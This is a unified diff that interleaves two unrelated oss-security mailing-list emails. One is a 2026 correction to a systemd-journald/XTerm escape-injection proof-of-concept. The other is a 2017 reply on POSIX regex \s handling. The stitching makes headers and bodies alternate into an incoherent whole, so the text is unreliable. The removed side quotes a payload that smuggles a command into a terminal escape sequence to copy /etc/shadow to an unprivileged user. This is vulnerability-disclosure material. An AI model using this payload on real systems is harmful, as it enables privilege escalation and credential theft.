@@ -1,4 +1,9 @@
-Received: (qmail 9388 invoked by uid 550); 8 Apr 2026 15:48:01 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["779" "Saturday" "17" "June" "2017" "18:24:23" "+0200" "Jakub Wilk" "jwilk@jwilk.net" "<20170617162423.7xrekndbw25zpzeh@jwilk.net>" "20" "Re: [oss-security] two vulns in uClibc-0.9.33.2" "^Date:" nil nil "6" "2017061716:24:23" "[oss-security] two vulns in uClibc-0.9.33.2" (number mark "        jwilk@jwilk. Jun 17   20/779   " thread-indent "\"Re: [oss-security] two vulns in uClibc-0.9.33.2\"\n") "<20170617122716.gsaalyhxkv7ekmdm@perpetual.pseudorandom.co.uk>" ("<tencent_18C312B86EA079DA42B11D83@qq.com>" "<20170616204437.GC2269@hunt>" "<CALx_OUAtt5gbRP+imZfXJwvgfs+Y5hrYqdmLhJHS7SRN5z_VCQ@mail.gmail.com>" "<alpine.GSO.2.20.1706162101560.12810@freddy.simplesystems.org>" "<CALx_OUCYUQO2Xdzp9XDGjZ=xXLzjxhNt6Z92N1anR67tEr-4EA@mail.gmail.com>" "<20170617122716.gsaalyhxkv7ekmdm@perpetual.pseudorandom.co.uk>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 7936 invoked by uid 550); 17 Jun 2017 16:24:49 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,70 +11,47 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 32363 invoked from network); 8 Apr 2026 14:23:05 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=riseup.net; s=squak;
-	t=1775658175; bh=xUbUOFFP1Vs9TBXjbPHGTpwLsP1iS9WcgK0RogZSg0U=;
-	h=Date:From:To:Cc:Subject:In-Reply-To:References:From;
-	b=AH+5Uqxn6xxmJQgWwlYq8c06LvO7KwoRfTLk7SSuAnW6gLJ0QDX4jbmf71+rX2zT6
-	 HVwIqbgzzIAvfTdbCxFXjdSxaJsYTBcs2povYeAYMl+IxSPx26asDOrzLv1sPJSSgt
-	 wvZ8QpKTaCgBvFnYQfmnuEJnPUtav92f71UtydEY=
-X-Riseup-User-ID: 44F605A70AA8B8CE57D5B1A0352EE9FF376EFD3D08A00A8B2380824EC28A347E
-Date: Wed, 8 Apr 2026 10:22:01 -0400
-From: Aaron Rainbolt <arraybolt3@riseup.net>
-To: oss-security@lists.openwall.com
-Cc: adrelanos@whonix.org, arraybolt3@gmail.com
-Message-ID: <20260408102148.0d45e3a2@riseup.net>
-In-Reply-To: <20260407200906.14b9bcc0@riseup.net>
-References: <20260407200906.14b9bcc0@riseup.net>
+Received: (qmail 7915 invoked from network); 17 Jun 2017 16:24:48 -0000
+Message-ID: <20170617162423.7xrekndbw25zpzeh@jwilk.net>
+Mail-Followup-To: oss-security@lists.openwall.com
+References: <tencent_18C312B86EA079DA42B11D83@qq.com>
+ <20170616204437.GC2269@hunt>
+ <CALx_OUAtt5gbRP+imZfXJwvgfs+Y5hrYqdmLhJHS7SRN5z_VCQ@mail.gmail.com>
+ <alpine.GSO.2.20.1706162101560.12810@freddy.simplesystems.org>
+ <CALx_OUCYUQO2Xdzp9XDGjZ=xXLzjxhNt6Z92N1anR67tEr-4EA@mail.gmail.com>
+ <20170617122716.gsaalyhxkv7ekmdm@perpetual.pseudorandom.co.uk>
 MIME-Version: 1.0
-Content-Type: multipart/signed; boundary="Sig_/UM6VD4j6MW4=v+r8Jbv/yi6";
- protocol="application/pgp-signature"; micalg=pgp-sha512
-Subject: [oss-security] Re: systemd-journald in systemd 259 does not escape characters in
- emerg messages that are wall'd to other user's terminals
+Content-Type: text/plain; charset=us-ascii; format=flowed
+Content-Disposition: inline
+In-Reply-To: <20170617122716.gsaalyhxkv7ekmdm@perpetual.pseudorandom.co.uk>
+User-Agent: NeoMutt/20170306 (1.8.0)
+X-Ovh-Tracer-Id: 6324461252059518886
+X-VR-SPAMSTATE: OK
+X-VR-SPAMSCORE: 0
+X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrfeeljedrkedugddutdefucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecufedttdenuc
+Date: Sat, 17 Jun 2017 18:24:23 +0200
+From: Jakub Wilk <jwilk@jwilk.net>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] two vulns in uClibc-0.9.33.2
+To: oss-security@lists.openwall.com
 
---Sig_/UM6VD4j6MW4=v+r8Jbv/yi6
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: quoted-printable
+* Simon McVittie <smcv@debian.org>, 2017-06-17, 13:27:
+>The two standardized POSIX dialects implemented by Unix C libraries (basic 
+>regexes as used in grep and sed, and extended regexes as used in grep -E and 
+>sed -E) aren't fully compatible with the Perl syntax: for example \s matches 
+>the letter s in BREs or EREs,
 
-A minor correction:
+Actually POSIX says outside a bracket expression, \s is undefined. (But in the 
+GNU libc regcomp() implementation, it matches a whitespace character.)
 
-> A more involved proof-of-concept that demonstrates how this can be
-> used to escalate privileges is:
->=20
-> 1. Compile a version of XTerm that is vulnerable to CVE-2022-45063.
->    (XTerm patch #369 worked for me last time I tried this.)
-> 2. Open two instances of XTerm at once as a non-root user.
-> 3. In one XTerm window, open a root shell by running `sudo -i`.
+Inside a bracket expression \s is meant literally, i.e. it matches either a 
+backslash or a letter "s". 
 
-The root shell needs to be provided by ZSH, and ZSH needs to be put
-into vi line editing mode, for this to work. See [1].
+>but matches any whitespace character in the Perl-derived dialects. This makes 
+>the POSIX regex functions not particularly useful for implementors of a 
+>JavaScript runtime.
 
-> 4. In the other XTerm window, as a non-root user, run
->    `pwned=3D$'\e]50;i$(cp /etc/shadow /home/user/shadow && chown
-> user:user /home/user/shadow)\a\e]50;?\a\n'` (replacing 'user' with
-> your non-root user's username where appropriate).
-> 5. In the same non-root XTerm window, run
->    `logger -p 'emerg' "$pwned"`. You should now have a copy of the
->    system's shadow password file in your home directory, readable by
->    your non-root user.
+Right.
 
-[1] https://www.openwall.com/lists/oss-security/2022/11/10/1
-
---
-Aaron
-
---Sig_/UM6VD4j6MW4=v+r8Jbv/yi6
-Content-Type: application/pgp-signature
-Content-Description: OpenPGP digital signature
-
------BEGIN PGP SIGNATURE-----
-
-iHUEARYKAB0WIQS8QsiCjFi4DcDBX+Q5rdye4jrrCAUCadZkiQAKCRA5rdye4jrr
-CAxaAP9BzNyyK6qLtVpZgIgFSW0kwIkTVvPiUWisTwOZhqTwQAEApVHTPESNYrV2
-2h1876ynlYZ/gkQGZT3+op8Kiu/ouwI=
-=Y1ni
------END PGP SIGNATURE-----
-
---Sig_/UM6VD4j6MW4=v+r8Jbv/yi6--
+-- 
+Jakub Wilk
